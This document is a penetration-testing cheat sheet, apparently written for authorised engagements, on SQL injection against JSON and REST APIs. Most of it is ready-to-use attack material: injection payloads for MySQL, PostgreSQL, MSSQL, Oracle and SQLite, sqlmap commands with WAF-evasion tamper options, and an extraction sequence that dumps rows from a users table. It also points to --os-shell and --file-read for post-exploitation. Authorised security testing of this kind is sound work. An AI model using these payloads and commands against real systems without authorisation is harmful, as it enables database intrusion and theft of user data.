# SQL Injection over JSON/REST APIs

## Contexts in an API

| Context | Example | Notes |
|---|---|---|
| JSON string value | `{"q": "PAYLOAD"}` | Payload lands inside a quoted SQL string server-side; break out with `'` or `"` |
| JSON numeric value | `{"id": 1}` → `{"id": "1 AND SLEEP(5)"}` or raw `{"id": 1}` with marker | Often concatenated unquoted — no quote needed |
| Path id | `GET /v1/users/1337*` | Classic numeric context; also try trailing `'` |
| Query param | `?sort=name*` | ORDER BY injection: `sort=name,(SELECT CASE WHEN 1=1 THEN name ELSE id END)` |
| Header | `X-Forwarded-For`, `User-Agent`, custom API keys | Logged/stored → second-order; test with `'` + time payloads |

JSON type substitution matters: if `{"id": "5"}` works, try `{"id": 5}` and
`{"id": "5 AND 1=1"}` — some ORMs parameterize strings but interpolate
numbers (or vice versa).

## Manual probe ladder

1. **Error-based** — send `'`, `"`, `\`, `')`, `'))`. Look for:
   - MySQL: `You have an error in your SQL syntax`, `mysql_fetch`, `MariaDB`
   - PostgreSQL: `pg_query`, `unterminated quoted string`, `syntax error at or near`
   - MSSQL: `Unclosed quotation mark`, `Microsoft OLE DB`, `ODBC SQL Server`
   - Oracle: `ORA-00933`, `ORA-01756`
   - SQLite: `SQLite3::`, `near "...": syntax error`
   - Also a bare 500 where baseline was 200, or a changed error envelope
     (`{"error":"internal"}` vs `{"error":"invalid input"}`).

2. **Boolean-blind** — paired probes, compare status/length:
   - String: `' OR '1'='1` vs `' AND '1'='2`
   - String, comment-closed: `' OR 1=1-- -` vs `' AND 1=2-- -`
   - Numeric: `1 OR 1=1` vs `1 AND 1=2`
   - Parenthesis escapes when plain forms fail: `1) OR 1=1-- -`,
     `1)) OR 1=1-- -`, `') OR ('1'='1`
   A stable, repeatable split between the TRUE and FALSE responses (count of
   rows, length, status) = injectable.

3. **Time-blind** — payload per DBMS, confirm the delta twice and with two
   different delays (5 then 10) to rule out jitter:
   - MySQL: `1 AND SLEEP(5)`, `' AND SLEEP(5)-- -`, `'||SLEEP(5)||'`
   - PostgreSQL: `';SELECT pg_sleep(5)--`, `'||pg_sleep(5)--`,
     `1;SELECT pg_sleep(5)--`
   - MSSQL: `1;WAITFOR DELAY '0:0:5'--`, `';WAITFOR DELAY '0:0:5'--`
   - Oracle: `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a`
   - SQLite: `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -` (heavy query)

4. **UNION** — find column count with `' ORDER BY 1-- -` … `ORDER BY N` until
   error, or `' UNION SELECT NULL-- -` adding `NULL`s. Then substitute a
   marker string per column to find which reflect:
   `' UNION SELECT NULL,CONCAT('inj',0x3a,version()),NULL-- -`.

## sqlmap against an API

### Preferred: saved raw request + marker

Build the request file (see `scripts/sqlmap_req.py`) with `*` at each
injection point. The marker works in the path, query, headers, and JSON body:

```
POST /v1/orders/search HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJ...

{"q": "widgets*", "limit": 10}
```

```
sqlmap -r request.txt --batch --level 2 --risk 2 --random-agent \
       --proxy http://127.0.0.1:8080
```

With no marker, sqlmap detects the JSON body and asks
`JSON data found in POST body. Do you want to process it? [Y/n]` — `Y` (or
`--batch`) makes it inject into every JSON leaf value, including nested
objects and arrays.

### Key flags

| Flag | Use |
|---|---|
| `-r request.txt` | Load raw request (TLS assumed if port 443; add `--force-ssl` otherwise) |
| `-u URL` + `--data '{"q":"x"}'` | Inline alternative; add `-H 'Content-Type: application/json'` |
| `-p q` | Restrict to one parameter (JSON keys work: `-p '"q"'` not needed, plain name is fine) |
| `--skip=limit` | Exclude noisy params |
| `--level 1-5` | 2+ tests headers/cookies; 3+ adds more boundaries |
| `--risk 1-3` | 2+ adds heavy time-based; 3 adds OR-based (can modify data on UPDATEs — know your endpoint) |
| `--dbms mysql` / `--technique BEUSTQ` | Focus once fingerprinted (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline) |
| `--batch` | Accept defaults, unattended |
| `--proxy http://127.0.0.1:8080` | Evidence capture |
| `--tamper=space2comment,between` | WAF evasion |
| `--flush-session` | Re-test from scratch |
| `--safe-url` / `--safe-freq` | Keep sessions alive between tests |
| `--second-url URL` | Second-order: injection lands in one request, surfaces in another |
| `--headers 'X-Api-Key: ...'` | Extra headers when not using `-r` |

### Minimal-impact extraction ladder

```
sqlmap -r request.txt --batch --current-user --current-db --banner --hostname
sqlmap -r request.txt --batch -D appdb --tables
sqlmap -r request.txt --batch -D appdb -T users --columns
sqlmap -r request.txt --batch -D appdb -T users -C username --dump --stop 1
```

One row proves extraction. `--os-shell`/`--file-read` only when the
engagement calls for post-exploitation depth.

### Reading sqlmap output

A confirmed point prints a block like:

```
sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: JSON q ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"q": "widgets' AND (SELECT 8086 FROM (SELECT(SLEEP(5)))x) AND 'a'='a", "limit": 10}
---
[INFO] the back-end DBMS is MySQL
```

- `Parameter:` names where (`JSON q`, `URI`, `Header #1`); `Type:` the
  technique; `Payload:` the exact working payload — reuse it for the finding's
  `http_exchange` evidence by replaying through the proxy.
- Session + traffic logs live under `~/.local/share/sqlmap/output/<host>/`
  (`log`, `session.sqlite`, `target.txt`); add `-t traffic.txt` to log every
  request/response.
- `all tested parameters do not appear to be injectable` → raise
  `--level/--risk`, pin `--dbms`, try marker in a different context (path,
  header), or re-check prefix/suffix with manual parenthesis escapes before
  concluding clean.

Finding: CWE-89, evidence = the confirming request/response pair, endpoint →
`exploited`. See `references/rupu.md`.
